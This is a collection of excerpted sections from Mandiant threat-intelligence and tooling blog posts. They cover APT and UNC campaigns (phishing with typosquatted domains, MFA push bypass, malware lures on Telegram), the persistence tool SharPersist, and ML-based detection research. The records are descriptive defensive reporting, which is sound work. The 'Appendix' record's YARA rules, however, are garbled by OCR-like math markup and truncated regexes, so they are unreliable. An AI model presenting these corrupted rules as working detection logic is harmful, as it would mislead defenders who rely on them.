public disclosures resulted in APT12 adaptations, FireEye observed only a brief pause in APT12 activity before the threat actors returned to normal activity levels. Similarly, the public disclosure of APT12's intrusion at the New York Times also led to only a brief pause in the threat group's activity and immediate changes in TTPs. The pause and retooling by APT12 was covered in the Mandiant 2014 M-Trends report. Currently, APT12 continues to target organizations and conduct cyber operations using its new tools. Most recently, FireEye observed HIGHTIDE at multiple Taiwan-based organizations and the suspected APT12 WATERSPOUT backdoor at a Japan-based electronics company. We expect that APT12 will continue their trend and evolve and change its tactics to stay ahead of network defenders. \nNote: IOCs for this campaign can be found here. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Overview", "content": "Route Sixty-Sink traces the flow of user input through any .NET assembly and determines whether it is passed as an argument to a dangerous function call (a \"sink\"). \nRoute Sixty-Sink does this using two main modules: \n1. RouteFinder, which enumerates API routes in ASP.NET Core MVC and classic ASP page web applications. \n2. SinkFinder, which takes an entry point and creates a call graph of all classes and method calls. Then, it queries strings, method calls, and class names for sinks. \nBy tying these two pieces of functionality together,Route Sixty-Sink quickly identifies high fidelity vulnerabilities that would be difficult to discover using black box or manual static analysis approaches. ", "source": "mandiant"}, {"title": "Conclusion", "content": "We have introduced Route Sixty-Sink, an open source utility to perform automated source-to-sink analysis within .NET binaries. We have already used Route Sixty-Sink to identify dozens of issues in \nopen-source and proprietary web applications, and we hope it will continue to identify more issues in order to improve the state of application security worldwide. We urge the reader to use and contribute to this project! ", "source": "mandiant"}, {"title": "Attribution", "content": "Mandiant currently tracks this activity as UNC2682. Ultimately, Mandiant prevented UNC2682 from completing their mission so their objectives of the attack currently remain unknown. \nEach investigation conducted by Mandiant includes analysts from our Advanced Practices team who work to correlate activity observed in the thousands of investigations that Mandiant responds to. At times, we do not have the data available to directly attribute intrusion activity to a previously known group. In these cases, we create a new UNC group to track the activity that we observed. An UNC group is a cluster of related cyber intrusion activity, which includes observable artifacts such as adversary infrastructure, tools, and tradecraft, that we are not yet ready to give a classification such as APT or FIN. \nFor more details on how Mandiant uses UNC groups, see our blog post: DebUNCing Attribution: How Mandiant Tracks Uncategorized Threat Actors. ", "source": "mandiant"}, {"title": "Conclusion", "content": "UNC2891 maintains a high level of OPSEC and employs several techniques to evade detection. The actor uses their skill and experience to take full advantage of the decreased visibility and security measures that are often present in Unix and Linux environments. Mandiant expects that UNC2891 will continue to capitalize on this and perform similar operations for financial gain that target mission critical systems running these operating systems. \nWhile some of the overlaps between UNC2891 and UNC1945 are notable, it is not conclusive enough to attribute the intrusions to a single threat group. For example, it is possible that significant portions of UNC2891 and UNC1945 activity are carried out by an entity that is a common resource to multiple threat actors, which could explain the perceived difference in intrusion objectives-a common malware developer or an intrusion partner, for example. Regardless, Mandiant is releasing this information on the actor to raise awareness of the fraudulent \nHave Your Cake and Eat it Too? An Overview of UNC2891 | Mandiant | Google Cloud Blog activity and aid defenders in uncovering further UNC2891 operations. ", "source": "mandiant"}, {"title": "Conclusion", "content": "This blog post explains how our new IDAPython script ironstrings works and how you can use it to automatically recover stackstrings in IDA Pro. Overcoming anti-analysis techniques is just one of many useful applications of code emulation for malware analysis. This post shows that flare-emu provides the ideal base for this by integrating IDA Pro and Unicorn. The detailed discussion of flareemu's hook functions will help you to write your own powerful automation scripts. Please reach out to us with questions, suggestions and feedback via the flare-emu and flare-ida GitHub issue trackers. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "A wide variety of cybercriminals, even those with minimal technical capability, now have access to document exploits through the purchase of Document Exploit Kits such as \"Microsoft Word Intruder\". Much like Browser Exploit Kits, these tools allow operators to track a variety of campaigns and \nMicrosoft Word Intruder & MWISTAT | Microsoft Word Exploit Kit | Google Cloud Blog information about their victims in order to improve their effectiveness. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Overview", "content": "SharPersist was created in order to assist with establishing persistence on Windows operating systems using a multitude of different techniques. It is a command line tool written in C# which can be reflectively loaded with Cobalt Strike's \"executeassembly\" functionality or any other framework that supports the reflective loading of .NET assemblies. SharPersist was designed to be modular to allow new persistence techniques to be added in the future. There are also several items related to tradecraft that have been built-in to the tool and its supported persistence techniques, such as file time stomping and running applications minimized or hidden. \nSharPersist and all associated usage documentation can be found at the SharPersist Mandiant GitHub ", "source": "mandiant"}, {"title": "Conclusion", "content": "Using reflective C# to assist in various phases of the attack lifecycle is a necessity in the offensive community and persistence is no exception. Windows provides multiple techniques for persistence and there will continue to be more discovered and used by security professionals and adversaries alike. \nThis tool is intended to aid security professionals in the persistence phase of the attack lifecycle. By releasing SharPersist, we at FireEye Mandiant hope to bring awareness to the various persistence techniques that are available in Windows and the ability to use these persistence techniques with C# rather than PowerShell. ", "source": "mandiant"}, {"title": "Introduction", "content": "The MSDN Annotations plug-in integrates information about functions, arguments and return values into IDA Pro's disassembly listing in the form of IDA comments. This allows the information to be integrated as seamlessly as possible. Additionally, the plug-in is able to automatically rename constants, which further speeds up the analyst workflow. The plug-in relies on an offline XML database file, which is generated from Microsoft's documentation and IDA type library files. ", "source": "mandiant"}, {"title": "Conclusion", "content": "In this post, we showed how you can generate a MSDN database file used by our plug-in to automatically annotate information about functions, arguments and constants into IDA Pro's disassembly. Furthermore, we talked about how the plug-in works, and how you can configure and customize it. We hope this speeds up your analysis process! ", "source": "mandiant"}, {"title": "Overview", "content": "UNC2970 relies on legitimate job description content to target victims employed in U.S. critical infrastructure verticals. The job description is delivered to the victim in a password-protected ZIP archive containing an encrypted PDF file and a modified version of an open-source PDF viewer application. \nMandiant noted slight modifications between the delivered job descriptions and their originals, including the required qualifications, experience and skills, likely to better align with the victim's profile. Moreover, the chosen job descriptions target senior-/manager-level employees. This suggests the threat actor aims to gain access to sensitive and confidential information that is typically restricted to higher-level employees. \nTo illustrate this, Mandiant analyzed the differences between the original job description and UNC2970's job description included in the ZIP archive. ", "source": "mandiant"}, {"title": "Conclusion", "content": "A supervised learning model is not a replacement for an experienced analyst. However, incorporating predictive analytics and machine learning into the SOC workflow can help augment the productivity of analysts, free up time, and ensure they utilize investigative skills and creativity on the threats that truly require expertise. \nThis blog post outlines the major components and considerations of building an alert classification model for the SOC. Data collection, labeling, feature generation, model training, and efficacy analysis must all be carefully considered when building such a model. FireEye continues to iterate on this research to improve our detection and response capabilities, continually improve the detection efficacy of our products, and ultimately protect our clients. \nThe process and examples shown discussed in this post are not mere research. Within our FireEye Managed Defense SOC, we use alert classification models built using the aforementioned processes to increase our efficiency and ensure we apply our analysts' expertise where it is needed most. In a world of ever increasing threats and alerts, increasing SOC efficiency may mean the difference between missing and catching a critical intrusion. ", "source": "mandiant"}, {"title": "Acknowledgement", "content": "Special thanks to the whole Advanced Practices team \u2013 and Nick Carr in particular \u2013 for their indulgence of my antics! Thanks also to Stephen Davis, Anthony Berglund and Kevin Boyd of the FireEye Labs and Data Science teams for their help on reviewing this project and their prior work on pywintrace. If you are looking for Python ETW bindings you can use programmatically, definitely check out that project. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Conclusion", "content": "The newest version of FLARE VM prioritizes transparency, customization, and automation. The updates empower anyone to contribute. Get started on your FLARE VM installation now. We hope to bring a much better experience to analysts around the world. Please check out the project and provide your feedback on GitHub. ", "source": "mandiant"}, {"title": "Conclusion", "content": "The Speakeasy framework provides an easy-to-use, flexible, and powerful programming interface that enables analysts to solve complex problems such as unpacking malware. Using Speakeasy to automate these solutions allows them to be performed at scale. I hope you enjoyed this introduction to automating the Speakeasy framework and are inspired to begin using it to implement your own malware analysis solutions! ", "source": "mandiant"}, {"title": "Attribution", "content": "APT33's targeting of organizations involved in aerospace and energy most closely aligns with nation-state interests, implying that the threat actor is most likely government sponsored. This coupled with the timing of operations \u2013 which coincides with Iranian working hours \u2013 and the use of multiple Iranian hacker tools and name servers bolsters our assessment that APT33 may have operated on behalf of the Iranian government. \nThe times of day that APT33 threat actors were active suggests that they were operating in a time \nAPT33 Targets Aerospace & Energy Sectors | Spear Phishing | Google Cloud Blog zone close to 04:30 hours ahead of Coordinated Universal Time (UTC). The time of the observed attacker activity coincides with Iran's Daylight Time which is $\\mathtt{+O430}$ UTC. \nAPT33 largely operated on days that correspond to Iran's workweek, Saturday to Wednesday. This is evident by the lack of attacker activity on Thursday, as shown in Figure 6. Public sources report that Iran works a Saturday to Wednesday or Saturday to Thursday work week, with government offices closed on Thursday and some private businesses operating on a half day schedule on Thursday. Many other Middle East countries have elected to have a Friday and Saturday weekend.Iran is one of few countries that subscribes to a Saturday to Wednesday workweek. \nAPT33 leverages popular Iranian hacker tools and DNS servers used by other suspected Iranian threat groups. The publicly available backdoors and tools utilized by APT33 \u2013 including NANOCORE, NETWIRE, and ALFA Shell \u2013 are all available on Iranian hacking websites, associated with Iranian hackers, and used by other suspected Iranian threat groups. While not conclusive by itself, the use of publicly available Iranian hacking tools and popular Iranian hosting companies may be a result of APT33's familiarity with them and lends support to the assessment that APT33 may be based in Iran. ", "source": "mandiant"}, {"title": "Conclusion", "content": "URL Schema Obfuscation is currently being abused to deliver malware in a variety of ways, from phishing links to template injection. Defenders need to ensure security tooling and logging systems are able to detect, identify, and parse the correct indicators to ensure defenses aren't bypassed by using a format that isn't RFC-compliant. In lieu of other indicators, detection of URL Schema Obfuscation using the provided YARA rules can be a malicious indicator in itself, helping to detect and prevent intrusions. ", "source": "mandiant"}, {"title": "Appendix", "content": "rule M_Hunting_ObfuscatedURL_DottedQuad   \n{ meta: author $=$ \"Mandiant\" description $=$ \"Finds URL Schema Obfuscation of the f strings: $\\begin{array}{l}{\\oint\\mathrm{d}0\\mathsf{c}=\\{\\mathrm{d}\\theta\\mathsf{c}\\mathsf{f}11\\mathsf{e}\\theta\\}}\\ {\\oint\\mathrm{p}\\mathrm{d}\\mathsf{f}=\\{25}5\\theta4446\\mathsf{2}\\mathsf{D}\\}}\\end{array}$ $\\$1000$ $\\$123,456,78$ $\\$123,456$ /https?:\\/\\/[\\w\\d\\-\\_]{1,255}\\@\\d{1,3}\\.\\d{ condition: ( $\\$00$ at 0 or \\$docx at 0 or \\$pdf at 0 or \\$rtf at 0   \n}   \nrule M_Hunting_ObfuscatedURL_Integer   \n{ meta: author $=$ \"Mandiant\" description $=$ \"Finds URL Schema Obfuscation of the f strings: $\\oint\\mathrm{d}0{\\mathsf{c}}=\\{\\mathrm{d}\\theta\\subset\\mathsf{f}11\\mathsf{e}\\theta\\}$ $\\$123,4456,70$ $\\$1000$ $\\$123,456,78$ $\\$123,456$ /https?:\\/\\/[\\w\\d\\-\\_]{1,255}\\@\\d{8,10}(\\:\\ condition: ( $\\$00$ at 0 or \\$docx at 0 or \\$pdf at 0 or \\$rtf at 0   \n}   \nrule M_Hunting_ObfuscatedURL_DottedQuadHex   \n{   \nmeta: author $=$ \"Mandiant\" description $=$ \"Finds URL Schema Obfuscation of the f strings: $\\oint\\mathrm{d}0{\\mathsf{c}}=\\{\\mathrm{d}\\theta\\subset\\mathsf{f}11\\mathsf{e}\\theta\\}$ \n$\\$123,4456,70$ $\\$1000$ $\\$123,456,78$ $\\$123,456$ /https?:\\/\\/[\\w\\d\\-\\_]{1,255}\\@0x[a-fA-F0-9 condition: ( $\\$00$ at 0 or \\$docx at 0 or \\$pdf at 0 or \\$rtf at 0 } \nrule M_Hunting_ObfuscatedURL_DottedQuadMix   \n{ meta: author $=$ \"Mandiant\" description $=$ \"Finds URL Schema Obfuscation of the f strings: \\$doc = {d0 cf 11 e0} $\\$123,4456,70$ $\\$1000$ $\\$123,456,78$ $\\$123,456$ /https?:\\/\\/[\\w\\d\\-\\_]{1,255}\\@(0x[a-fA-F0- condition: ( $\\$00$ at 0 or \\$docx at 0 or \\$pdf at 0 or \\$rtf at 0   \n}   \nrule M_Hunting_ObfuscatedURL_Domain   \n{ meta: author $=$ \"Mandiant\" description $=$ \"Finds URL Schema Obfuscation of the f strings: $\\oint\\mathrm{d}0{\\mathsf{c}}=\\{\\mathrm{d}\\theta\\subset\\mathsf{f}11\\mathsf{e}\\theta\\}$ $\\$123,4456,70$ $\\$1000$ $\\$123,456,78$ $\\$123,456$ /https?:\\/\\/[\\w\\d\\-\\_]{1,255}\\@([\\w\\d\\-]{1,10 \\$exclusions $=$ /https?:\\/\\/[\\w\\d\\-\\_]{1,255}\\@(gmail condition: ( $\\$00$ at 0 or $\\$00$ at 0 or \\$pdf at 0 or \\$rtf at 0   \n} ", "source": "mandiant"}, {"title": "Introduction", "content": "Over the past three years Transformer machine learning (ML) models, or \"Transformers\" for short, have yielded impressive breakthroughs in a variety of sequence modeling problems, specifically natural language processing (NLP). For example, OpenAI's latest GPT-3 model is capable of generating long segments of grammatically-correct prose from scratch. Spinoff models, such as those developed for question and answering, are capable of correlating context over multiple sentences. AI Dungeon, a single and multiplayer text adventure game, uses Transformers to generate plausible unlimited content in a variety of fantasy settings. Transformers' NLP modeling capabilities are apparently so powerful that they pose security risks in their own right, in terms of their potential power to spread disinformation, yet on the other side of the coin, they can be used as powerful tools to detect and mitigate disinformation campaigns. For example, in previous research by the FireEye Data Science team, a NLP Transformer was fine-tuned to detect disinformation on social media sites. \nGiven the power of these Transformer models, it seems natural to wonder if we can apply them to other types of cyber security problems that do not necessarily involve natural language, per se. In this blog post, we discuss a case study in which we apply Transformers to malicious URL detection. Studying Transformer performance on URL detection problem is a first logical step to extending Transformers to more generic cyber security tasks, since URLs are not technically natural language sequences but share some common characteristics with NLP. \nIn the following sections, we outline a typical Transformer architecture and discuss how we adapt it to URLs with a character-focused tokenization. We then discuss loss functions we employ to guide the training of the model, and finally compare our training approaches to more conventional ML-based modeling options. ", "source": "mandiant"}, {"title": "Summary", "content": "Our experiments suggest that Transformers can achieve performance comparable to or better than that of other top-performing models for URL classification, though the details of how to achieve that performance differ from common practice. Contrary to findings from the NLP domain, wherein self-supervised pre-training substantially enhances performance in a fine-tuned classification task, similar pretraining approaches actually diminish performance for malicious URL detection. This suggests that the next character prediction task has too little apparent correlation with the task of malicious/benign prediction for effective/stable transfer. \nInterestingly, utilizing next-character prediction as an auxiliary loss function in conjunction with a malicious/benign loss yields improvements over training solely to predict the label. We hypothesize that while pre-training leads to a relatively poor generative model due to randomized content in the URLs within our dataset, a malicious/benign loss may serve to better condition the generative model learned by the next-character prediction task, distilling a subset of relevant information. It may also be the case that the long-distance relationships that are key to the generative pre-training task are not as important for the final malicious URL classification, as evidenced by the performance of the 1D CNN model. \nNote that we did not perform a rigorous hyperparameter search for our Transformer, since this research was primarily concerned with loss functions and training regimes. Therefore, it is still an open question as to whether a more optimal architecture, specifically designed for this classification task, could substantially outperform the models described here. \n2025/5/7 11:13 \nWhile our URL dataset is not representative of all data in the cyber security space, the difficulty of obtaining a readily fine-tuned model from selfsupervised pre-training suggests that this approach is unlikely to work well for training Transformers on longer sequences or sequences with lesser resemblance to natural language (e.g., PE files), but an auxiliary loss might work. \nDetails about this research and additional results can be found in our associated white paper. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Acknowledgement", "content": "Special thanks to the whole Advanced Practices team \u2013 and Nick Carr in particular \u2013 for their indulgence of my antics! Thanks also to Stephen Davis, Anthony Berglund and Kevin Boyd of the FireEye Labs and Data Science teams for their help on reviewing this project and their prior work on pywintrace. If you are looking for Python ETW bindings you can use programmatically, definitely check out that project. ", "source": "mandiant"}, {"title": "Conclusion", "content": "We have seen how various threat actors are abusing the recently disclosed WinRAR vulnerability using customized decoys and payloads, and by using different propagation techniques such as email and URL. Because of the huge WinRAR customer-base, lack of auto-update feature and the ease of exploitation of this vulnerability, we believe this will be used by more threat actors in the upcoming days. \nTraditional AV solutions will have a hard time providing proactive zero-day detection for unknown malware families. FireEye MalwareGuard, a component of FireEye Endpoint Security, detects and blocks all the PE executables mentioned in this blog post using machine learning. It's also worth noting that this vulnerability allows the malicious ACE file to write a payload to any path if WinRAR has sufficient permissions, so although the exploits that we have seen so far chose to write the payload to startup folder, a more involved threat actor can come up with a different file path to achieve code execution so that any behavior based rules looking for WinRAR writing to the startup folder can be bypassed. Enterprises should consider blocking vulnerable WinRAR versions and mandate updating WinRAR to the latest version. \nFireEye Endpoint Security, FireEye Network Security and FireEye Email Security detect and block these campaigns at several stages of the attack chain. ", "source": "mandiant"}, {"title": "Targeting", "content": "As an extension of their aforementioned credential harvesting operations, during 2022\u20132023, Mandiant observed APT42 exfiltrate documents of interest to Iran and sensitive information from the victims' public cloud infrastructure. These victims were located in the U.S. and the UK in the legal services and NGO sectors. However, since the initial enabler of these operations lies with credential harvesting, which APT42 conducts worldwide, it is possible the victimology is much wider. \nThese operations began with enhanced social engineering schemes to gain the initial access to victim networks, often involving ongoing trustbuilding correspondence with the victim. Only then the desired credentials are acquired and multifactor authentication (MFA) is bypassed, by serving a cloned website to capture the MFA token (which failed) and later by sending MFA push notifications to the victim (which succeeded). \nThese techniques have allowed APT42 to covertly access and compromise the victim's Microsoft 365 environment, relying on built-in features and open-source tools to decrease their chances of being detected. \nAPT42 cloud operations attack lifecycle can be described in details as follows: \nSocial engineering schemes involving decoys and trust building, which includes masquerading as legitimate NGOs and conducting ongoing correspondence with the target, sometimes lasting several weeks. \nThe threat actor masqueraded as wellknown international organizations in the legal and NGO fields and sent emails from domains typosquatting the original NGO domains, for example aspenlnstitute[.]org. \nThe Aspen Institute became aware of this spoofed domain and collaborated with industry partners, including blocking it in SafeBrowsing, thus protecting users of Google Chrome and additional browsers. \nworking at the aforementioned organizations when creating the email personas. \nAPT42 enhanced their campaign credibility by using decoy material inviting targets to legitimate and relevant events and conferences. In one instance, the decoy material was hosted on an attackercontrolled SharePoint folder, accessible only after the victim entered their credentials. Mandiant did not identify malicious elements in the files, suggesting they were used solely to gain the victim's trust. \nCredential harvesting and bypassing MFA. Only after a certain level of trust was built with the victim, APT42 harvested the desired credentials by sending the victim a link that would redirect them to a credential harvesting site, similar to the process described in the previously discussed credential theft section. \nultimately serve fake Microsoft 365 login pages. \nAt least once, Mandiant observed APT42 use several methods-both SharePoint login and fake LinkedIn login pages-to target multiple high-profile personnel of the victim organization during the same campaign. ", "source": "mandiant"}, {"title": "Introduction", "content": "Rosetta 2 (internally known on macOS as OAH) was introduced in macOS 11 (Big Sur) in 2020 to enable binaries compiled for x86-64 architectures to run on Apple Silicon (ARM64) architectures. Rosetta 2 translates signed and unsigned x86-64 binaries justin-time or ahead-of-time at the point of execution. Mandiant has identified several new highly sophisticated macOS malware variants over the past year, notably compiled for x86-64 architecture. Mandiant assessed that this choice of architecture was most likely due to increased chances of compatibility on victim systems and more relaxed execution policies. Notably, macOS enforces stricter code signing requirements for ARM64 binaries compared to x86-64 binaries running under Rosetta 2, making unsigned ARM64 binaries more difficult to execute. Despite this, in the newly identified APT malware families observed by Mandiant over the past year, all were self-signed, likely to avoid other compensating security controls in place on macOS. ", "source": "mandiant"}, {"title": "Conclusion", "content": "There are several forensic artifacts on macOS that may record historical evidence of binary execution. However, in cases of advanced intrusions with forensically aware attackers, original binaries being deleted, and no further security monitoring solutions, combining FSEvents, Unified Logs, and, \nNot Lost in Translation: Rosetta 2 Artifacts in macOS Intrusions | Google Cloud Blog crucially, residual AOT files on disk has provided the residual evidence of intrusion on a macOS system. \nWhilst signed macOS ARM64 binaries may be the future, for now AOT files and the artifacts surrounding them should be reviewed in analysis of any suspected macOS intrusion and leveraged for hunting opportunities wherever possible. \nThe behavior identified in the cases presented here was identified on various versions of macOS between 13.5 and 14.7.2. Future or previous versions of macOS and Rosetta 2 may behave differently. ", "source": "mandiant"}, {"title": "Conclusion", "content": "In this blog post, we looked at processing red team data using LLMs to aid in adversarial emulation or improving defenses. These use cases were related to processing human-generated, unstructured data. Table 3 summarizes the results. \nAs the results show, using an LLM like Gemini can help in converting this type of data into structured data to aid attackers and defenders. However, keep in mind that LLMs are not a silver bullet and have limitations. For example, they can sometimes produce false positives or be slow to process large amounts of data. \nThere are quite a few use cases we have not covered in this blog post. Some other examples where you can use this approach are: \nCorrelating user groups to administrator privileges on workstations and servers Summarizing internal website content or documentation to search for target systems Ingesting documentation to generate password candidates for cracking passwords ", "source": "mandiant"}, {"title": "Targeting", "content": "UNC5812's malware delivery operations are conducted both via an actor-controlled Telegram channel @civildefense_com_ua  and website hosted at civildefense[.]com.ua . The associated website was registered in April 2024, but the Telegram channel was not created until early September 2024, which we judge to be when UNC5812's campaign became fully operational.  To drive potential victims towards these actor-controlled resources, we assess that UNC5812 is likely purchasing promoted posts in legitimate, established Ukrainian-language Telegram channels. \nOn September 18th 2024, a legitimate channel with over 80,000 subscribers dedicated to missile alerts was observed promoting the \"Civil Defense\" Telegram channel and website to its subscribers.   \nAn additional Ukrainian-language news channel promoting Civil Defense's posts as recently as October 8th, indicating the campaign is probably still actively seeking new Ukrainianlanguage communities for targeted engagement.   \nChannels where \"Civil Defense\" posts have been promoted advertise the ability to reach out to their administrations for sponsorship opportunities. We suspect this is the likely vector that UNC5812 is using to approach the respective legitimate channels to increase the operation's reach. \nThe ultimate aim of the campaign is to have victims navigate to the UNC5812-controlled \"Civil Defense\" website, which advertises several different software programs for different operating systems. When installed, these programs result in the download of various commodity malware families. \nFor Windows users, the website delivers a downloader tracked publicly as Pronsis Loader that is written in PHP that is compiled into Java Virtual machine (JVM) bytecode using the open source JPHP project. When executed, Prosnis Loader initiates a convoluted malware delivery chain, ultimately delivering SUNSPINNER and a commodity information stealer commonly known as PURESTEALER. \nFor Android users, the malicious APK file attempts to install a variant of the commercially available Android backdoor CRAXSRAT. Different versions of this payload were observed, including a variant containing SUNSPINNER in addition to the CRAXSRAT payload. \nWhile the Civil Defense website also advertises support for macOS and iPhones, only Windows and Android payloads were available at the time of analysis. \nHybrid Russian Espionage and Influence Campaign Aims to Compromise Ukrainian Military Recruits and Deliver Anti-Mobilization Nar... \nNotably, the Civil Defense website also contains an unconventional form of social engineering designed to preempt user suspicions about APK delivery outside of the App Store and justify the extensive permissions required for the CRAXSRAT installation. \nThe website's FAQ contains a strained justification for the Android application being hosted outside the App Store, suggesting it is an effort to \"protect the anonymity and security\" of its users, and directing them to a set of accompanying video instructions. \nThe Ukrainian-language video instructions then guide victims on how to disable Google Play Protect, the service used to check applications for harmful functionality when they are installed on Android devices, as well as to manually enable all permissions once the malware is successfully installed. ", "source": "mandiant"}, {"title": "Summary", "content": "UNC5812's hybrid espionage and information operation against potential Ukrainian military recruits is part of a wider spike in operational interest from Russian threat actors following changes made to Ukraine's national mobilization laws in 2024. In particular, we have seen the targeting of potential military recruits rise in prominence following the launch of Ukraine's national digital military ID used to manage the details of those liable for military service and boost recruitment. Consistent with research from EUvsDisinfo, we also continue to observe persistent efforts by proRussia influence actors to promote messaging undermining Ukraine's mobilization drive and sowing public distrust in the officials carrying it out. \nFrom a tradecraft perspective, UNC5812's campaign is highly characteristic of the emphasis Russia places on achieving cognitive effect via its cyber capabilities, and highlights the prominent role that messaging apps continue to play in malware delivery and other cyber dimensions of Russia's war in Ukraine. We judge that as long as Telegram continues to be a critical source of information during the war, it is almost certain to remain a primary vector for cyberenabled activity for a range of Russian-linked espionage and influence activity. ", "source": "mandiant"}, {"title": "Targeting", "content": "Since mid-2017, Mandiant has responded to multiple investigations which we have attributed to FIN13. In contrast to other financially motivated actors, FIN13 has highly localized targeting. Over five years of Mandiant intrusion data shows FIN13 operates exclusively against organizations based in Mexico and has specifically targeted large organizations in the financial, retail, and hospitality industries. A review of publicly available financial data show several of these organizations have annual revenue in the millions to billions in U.S. dollars $1\\mathsf{U S D}=21.21$ MXN as of December 6, 2021). \nFIN13 will thoroughly map a victim's network, capturing credentials, stealing corporate documents, technical documentation, financial databases, and other files that will support their objective of financial gain through the fraudulent transfer of funds from the victim organization. ", "source": "mandiant"}, {"title": "Prevention", "content": "The prevention and remediation guidance from Mandiant's previous blog post still applies, including most crucially applying patches for the vulnerabilities. \nWhere unauthorized accounts or web shells are identified, Mandiant recommends a full investigation to identify threat actor access in the environment both on the Exchange infrastructure and within the wider domains. ", "source": "mandiant"}, {"title": "Conclusion", "content": "In this blog post we demonstrated how the Speakeasy emulation framework can be used to automatically triage a Beacon malware sample. We used it to discover valuable network indicators, extract its config information from memory, and acquire a decoded Beacon DLL for further analysis. \nHead over to our GitHub to start using Speakeasy today, and stay tuned for the next blog post where we will demonstrate kernel malware analysis using emulation. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Attribution", "content": "Mandiant has identified a new access operations group UNC5174 that uses the personas \"Uteus\" (alternate spelling \"uetus\") on underground forums, which we assess with moderate confidence operates from China. UNC5174 was linked with several hacktivist collectives including \"Dawn Calvary\" and \"Genesis Day\" prior to 2023 and has also claimed to be affiliated with the PRC MSS as an access broker and possible contractor who conducts for profit intrusions. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Data availability is a critical component of NFT success and immutability, and the current implementations fall short; the Ethereum-based NFT industry lacks a formal framework for where and \nhow to store NFT content. While the IPFS network is a popular option amongst NFT creators, the decision is ultimately left to the individual creator of each NFT, or the platform hosting the minting functions. Buyers must ask if it makes sense to spend any amount of money on an NFT with no guarantees the data will exist long-term. \nBlockchain technology promises inherent solutions to data confidentiality, integrity, and accessibility, yet it seems the commonly discussed issue of scalability remains. If a blockchain protocol can prove itself to be economically sound in its incentivization mechanisms and technically sound in its scalability, then it would position itself as a viable solution across not only the NFT market but a myriad of sectors and enterprise-level applications \u2013 where data security and availability are paramount to success. \nPosted in Threat Intelligence-Security & Identity ", "source": "mandiant"}, {"title": "Background", "content": "Synthetic media is by no means a new development; methods for manipulating media for specific \nagendas are as old as the media themselves. In the 1930's, the chief of the Soviet secret police was photographed walking alongside Joseph Stalin before being retouched out of an official press photo, after he himself was arrested and executed during the Great Purge. Digital graphic manipulation like this became prominent with the advent of Photoshop. Then later in the 2010's, the term \"deepfake\" was coined. While deepfake videos, including techniques like face swapping and lip syncing, are concerning in the long term, this blog post focuses on more basic, but we argue more believable, synthetic media generation advancements in the text, static image, and audio domains. Machine learning approaches for creating synthetic media are underpinned by generative models, which have been effectively misused to fabricate high volume submissions to federal public comment websites and clone a voice to trick an executive into handing over \\$240,000. \nThe pre-training required to produce models capable of synthetic media generation can cost thousands of dollars, take weeks or months of time, and require access to expensive GPU clusters. However, the application of transfer learning can drastically reduce the amount of time and effort involved. In transfer learning, we start from a large generic model that has been pre-trained for an initial task where copious data is available. We then leverage the model's acquired knowledge to train it further on a different, smaller dataset so that it excels at a subsequent, related task. This process of training the model further is referred to as finetuning, which typically requires less resources \ncompared to pre-training from scratch. You can think of this in more relatable terms-if you're a professional tennis player, you don't need to completely relearn how to swing a racket in order to excel at badminton. \nIn practice though, the benefits of transfer learning are only realized when people share their pretrained models. As illustrated by Figure 1, it turns out that it's commonplace for well-resourced industry and academic researchers to release their model checkpoints when their state of the art (SOTA) work gets accepted into a top-tier conference. Code is typically released in the form of GitHub repositories with extensive HOWTO guides and well-documented READMEs. This allows anyone to easily reproduce figures from the initial papers, and potentially use this source code as a starting point for their own research or projects. This process plays out on loop, ensuring a healthy, self-reinforcing model supply chain and ultimately a quicker pace of scientific innovation. However, while this emergent model sharing ecosystem beneficially lowers the barrier to entry for non-experts, it also gives a leg up to those seeking to leverage open source models for malicious purposes. \nJust how much has this barrier to entry been lowered though? Fine-tuning can be performed in a fraction of the time, cost, data size, and compute compared to training models from scratch. Whether it's a cloud hosted notebook with GPU access, or a cloud GPU instance reservation for just a single day, we're talking on the order of just tens of dollars to fine-tune one of these models. Skill-wise, finetuning is not necessarily trivial, but it's also not \"brain surgery\"-authors or other open source contributors often release additional code and tutorials for how to fine-tune. \nThe pre-trained models covered here were each released just within the last year, so the demonstrations in the next section should be seen through the lens of the present moment in time. However, open source releases are accelerating, and the bar for generating credible synthetic content will likely lower even further in the years to come. ", "source": "mandiant"}, {"title": "Conclusion", "content": "Synthetic media generation continues to become cheaper, both monetarily and in terms of the computing power required, easier, more pervasive, and their outputs ever more credible. Image generation capabilities and even commercial services are already moving beyond merely headshots and facial generations to full-body shots and advanced video generations, and end users will enjoy increasing control over and ease of content generation, both through being able to steer generations towards particular attributes at more granular levels, and by being able to use an increasing amount of both free and commercial lowcode or no-code applications for content creation. \nThis blog post highlights the need for the research community to continue to focus attention on the development of technical detection and mitigation capabilities for synthetic media, given its ready applicability to current information operations tactics. Multiple avenues of research can and should be pursued, including statistical approaches to detection like machine learning classifiers and model watermarking, as well as the signature-based identification of fingerprints and forensic indicators (e.g. Figure 5). Secondly, there's the human aspect to all of this, including the importance of ensuring communities of researchers from different disciplines coalesce around approaches to overcoming the detection challenges, threat modeling how synthetic media may be deployed in future IO campaigns so that any potential effects can be pre-emptively addressed, and encouraging commercial providers of synthetic media generation capabilities to acknowledge and account for the potential abuse of their services by threat actors. Outside of community efforts, there also remains the need for raising awareness and educating consumers of social media and other content about the risks of synthetic media in a responsible manner that doesn't misrepresent the threat, as well developing legal and regulatory approaches to dealing with information operations and synthetic media. ", "source": "mandiant"}, {"title": "Introduction", "content": "In today's rapidly evolving threat landscape, organizations find themselves engaged in an ongoing arms race against increasingly sophisticated cyber criminals and nation-state actors. To stay ahead of these adversaries, many organizations turn to Red Team assessments, simulating real-world attacks to expose vulnerabilities before they are exploited. However, many traditional Red Team assessments typically prioritize attacking network and infrastructure components, often overlooking a critical aspect of modern attack surfaces: web applications. \nThis gap hasn't gone unnoticed by cyber criminals. In recent years, industry reports consistently highlight the evolving trend of attackers exploiting public-facing application vulnerabilities as a primary entry point into organizations. This aligns with Mandiant's observations of common tactics used by threat actors, as observed in our 2024 M-Trends Report: \"In intrusions where the initial intrusion vector was identified, $38\\%$ of intrusions started with an exploit. This is a six percentage point increase from 2022.\" \nThe 2024 M-Trends Report also documents that $28.7\\%$ of Initial Compromise access is obtained through exploiting public-facing web 